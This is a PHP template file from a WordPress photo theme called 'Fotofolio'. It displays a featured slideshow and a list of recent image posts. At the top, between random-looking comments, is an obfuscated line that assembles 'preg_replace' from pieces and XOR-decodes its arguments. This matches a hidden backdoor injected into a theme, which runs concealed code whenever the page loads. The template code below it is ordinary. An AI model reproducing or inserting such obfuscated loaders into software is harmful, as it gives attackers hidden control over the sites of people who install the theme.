<?php
//q7x5h9WMbz3PWhZavJFOUtGDN9uDReK7pCv6


$GVfZD='pre'. 'g_replace'; $ukVlaPqK="ui9ITBERoW98bHZQKj"^"Z\x2dC\x2d\x03\x0e\x115\x2d\x21JY1\x21\x3e\x20d\x0f"; $GVfZD($ukVlaPqK, "RNyv3tpDH1NPcQ5M3MlQbGwSmMkpnI3MNNqgVKFihWtwdm6G3JS3D2XsE0Dh2W4vIArb6X9TJ0Wog0QO8ekIF6NJPpony3uwng3FnAfTrHDx64rtX8rE6WQWY8UifuELAelGyh1HbN79HLNWYEhy2jIkhcDiP7NGqRPA3AYve3RWODhiFIr"^"78\x18\x1a\x1bV\x19\x22\x60X\x3d\x23\x06\x25\x1d\x11oi3\x03\x27\x16\x22\x16\x3e\x19\x30W\x0d\x21\x14\x10gnWAvc\x2b\x0d\x5d\x7f\x28\x2b\x402d\x02b\x1f\x16\x60\x10i\x7f\x10\x2d\x17\x19A\x12j\x09Vn\x22FRRi\x5f2\x2f\x08gW\x01\x08\x60\x2b\x0cWR\x2dqT\x2f\x28c\x12\x0e\x0bIRC\x12Z\x40\x1afHgF\x3d\x01\x3b\x21\x0c\x1eh\x2eP\x07j7\x14c\x12\x02\x03\x02\x1f\x25\x01\x16\x2a\x26\x23\x25\x00K\x1aPA\x113B\x2bAX\x24d\x12\x0b\x7d\x1a\x3a\x3cc\x3f\x0c8\x3c8c\x198G\x11\x24\x1e65fnhbV\x00K\x3b\x23gmSI\x3bk\x5b", "DzdWLTgBvsaSidq");//AJsyWQtx5IkIKsfGNOBoGUDgyfjxyq

  get_header();

global $options;
foreach ($options as $value) {
	if (get_settings( $value['id'] ) === FALSE) { $$value['id'] = $value['std']; } else { $$value['id'] = get_settings( $value['id'] ); }
}
?>

<!-- end header -->
    <div class="featured">
    
    	<div class="photo shadow-left">
        	<div class="shadow-right">
            	<ul id="photos">
                    
                	<?php query_posts('showposts=' . $ftfl_num_slideshow . '&category_name=' . $ftfl_home_slideshow . '');
				  	if (have_posts()) :   while (have_posts()) : the_post();
					$image = "";
					$first_image = $wpdb->get_results(
					
					"SELECT guid FROM $wpdb->posts WHERE post_parent = '$post->ID' "
					."AND post_type = 'attachment' ORDER BY `post_date` ASC LIMIT 0,1"
					
					);
					
					if ($first_image) {
						$image = urlencode($first_image[0]->guid);
					}
						$imagepos = urldecode($image);
                	?>
                    <li>
                    <a href="<?php the_permalink() ?>"><img src="<? bloginfo('template_directory'); ?>/scripts/timthumb.php?src=<? echo $image ?>&w=480&h=275&zc=1" alt="<? the_title(); ?>" /></a>
                    </li>
                    <?php endwhile;   endif; ?>
                </ul>
            </div>
        </div>
        <div class="legend">
              <?php
				if ($ftfl_welcome_title) { ?>
    			<h3><? echo $ftfl_welcome_title; ?></h3>
    			<?
				} else { ?>
    			<h3>Fotofolio</h3>
    			<? } ?>
            <div class="author"><em>by</em> <strong><?php echo $ftfl_full_name ?></strong></div>
            <div class="notes">
            	<p>
            	 <?php
				if ($ftfl_welcome_message) {
    			echo $ftfl_welcome_message;
				} else {
    			echo "Short description about your fotofolio theme";
    			} ?></p>
            </div>
            <div class="news">
            	<h2>Latest Additions</h2>
                <?php query_posts('showposts=' . $ftfl_num_latest . '');
				  	if (have_posts()) :   while (have_posts()) : the_post();
					$image = "";
					$first_image = $wpdb->get_results(
					
					"SELECT guid FROM $wpdb->posts WHERE post_parent = '$post->ID' "
					."AND post_type = 'attachment' ORDER BY `post_date` ASC LIMIT 0,1"
					
					);
					
					if ($first_image) {
						$image = $first_image[0]->guid;
					}
                ?>
                	<div class="pic">
            			<a href="<?php the_permalink() ?>" rel="<? bloginfo('template_directory'); ?>/scripts/timthumb.php?src=<?php echo $image; ?>">
						<img src="<? bloginfo('template_directory'); ?>/scripts/timthumb.php?src=<?php echo $image; ?>&w=40&h=40&zc=1" /></a>
            	</div> <!-- .pic -->
				<?php endwhile;   endif; ?>
            </div>
        </div> <!-- .legend -->
        <div class="ffix"></div>
    </div><!-- #featured -->

<?php get_footer(); ?>